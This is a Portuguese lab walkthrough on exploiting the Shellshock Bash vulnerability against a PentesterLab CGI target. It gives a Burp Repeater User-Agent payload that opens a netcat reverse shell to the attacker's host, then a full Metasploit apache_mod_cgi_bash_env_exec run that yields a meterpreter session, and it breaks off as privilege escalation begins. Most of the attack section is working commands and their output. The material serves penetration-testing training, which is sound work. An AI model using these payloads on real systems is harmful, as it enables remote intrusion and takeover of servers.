# ShellShock

Shellshock é um conjunto de falhas críticas descobertas em 24/09/2014 no **GNU Bash** (o shell padrão em muitos sistemas Unix-like). O erro está na forma como o Bash **importa funções via variáveis de ambiente**: um invasor consegue “colar” *comandos extras* depois da definição da função; ao iniciar, o Bash acabava executando esses comandos, resultando em **execução remota de código (RCE)**. 

**Exploração:**

Muitos serviços montam variáveis de ambiente e depois chamam o Bash. Se campos controlados pelo usuário (por exemplo, cabeçalhos HTTP em **CGI**), opções de **DHCP**, ou certos fluxos de **SSH** forem repassados ao ambiente e um processo acionar o Bash, os comandos injetados podem ser executados no host. Por isso a falha foi especialmente perigosa em servidores web com CGI habilitado. 

**Identificadores e alcance:**

Shellshock é uma vunerabilidade antiga, improvável de ser encontrada atualmente. O primeiro CVE foi **CVE-2014-6271**, seguido por correções adicionais (**CVE-2014-7169**, **CVE-2014-6277**, **CVE-2014-6278**, entre outros), porque patches iniciais não cobriam todos os vetores. Afetou diversas distribuições Linux e também o macOS da época, que receberam atualizações rapidamente.  Devido a sua importância à época, é usada hoje para fins didáticos.

## Análise do fluxo e ataque com BurpSuite

1. Abra o BurpSuite
2. Na guia **Proxy**, abra o browser do BurpSuite. Ele já vem configurado com atribuições de proxy.
3. No browser digite o IP da máquina alvo para abrir o seu website
4. Abra a aba **Target/SiteMap** do BurpSuite
5. Clique no método GET ditetório /cgi-bin/status.
  - Obeserve a linha **User-agente** do **request**
  - Com o botão direito do mouse no painel **request**, selecione **send to repeater**
6. Abra a aba **Repeater**, e substitua o coneteúdo do **User_agent** por `() { :;}; ` (comando nulo) seguido pelo comando que deseje executar na máquina alvo entre aspas simples (').
  - No exemplo, queremos abrir um netcat...
    - `() { :; }; /bin/bash -c 'nc 192.168.0.178 5555 -e /bin/bash'`
7. Na máquina de ataque inicie no terminal um netcat modo listener para conecção com o alvo `nc -lvp 5555`
8. No Burp, clique em **send**.
9. Pronto, temos uma conexão válida e podemos prosseguir escalando privilégios e criando persistência (como visto em *6 - Post Exploitation*).

```
└─$ nc -lvp 5555                                                                              
listening on [any] 5555 ...
192.168.0.141: inverse host lookup failed: Host name lookup failure
connect to [192.168.0.178] from (UNKNOWN) [192.168.0.141] 42436
whoami
pentesterlab
pwd
/var/www/cgi-bin
```

## Ataque com o Metasploit

### 1 - Pesquisa e seleção de exploit
Pesquisando o Metasploit pelo termo "shellshock"
```
msf > search shellshock

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   2     \_ target: Linux x86                             .                .          .      .
   3     \_ target: Linux x86_64                          .                .          .      .
   4   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
...
   15  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
```
Descrição (show info);
```
Description:
  This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
  handles external environment variables. This module targets CGI scripts in the
  Apache web server by setting the HTTP_USER_AGENT environment variable to a
  malicious function definition.
```
Este exploit explora a vunerabilidade que estamos testando.
```
msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
```
### 2 - Configuração
```
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE
                                              -2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:
                                              port][...]. Supported proxies: sapni, socks4, sock
                                              s5, http, socks5h
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.co
                                              m/docs/using-metasploit/basics/using-metasploit.ht
                                              ml
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is rando
                                              mly generated)
   TARGETURI                        yes       Path to CGI script
   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random
                                              )
   VHOST                            no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This mu
                                       st be an address on the local machine or 0.0.0.0 to liste
                                       n on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.10     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86
```
É preciso informar:
- O RHOSTS
```
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.1.43
RHOSTS => 192.168.1.43
```
O caminho para o CGI script (/cgi-bin/status) conforme comando GET mo request (Burp Suite)
```
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/status
TARGETURI => /cgi-bin/status
```
### 3 - Execução

Ao executar o exploit, ganhamos acesso a máquina alvo através do meterpreter
```
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 192.168.1.43
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.43:33164) at 2025-09-09 12:52:29 -0300

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > getuid
Server username: pentesterlab
meterpreter > pwd
/var/www/cgi-bin
```

## Escalando privilégios
```
meterpreter > getuid
Server username: pentesterlab
```
```
meterpreter > sysinfo
Computer     : 192.168.1.43
OS           :  (Linux 3.14.1-pentesterlab)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
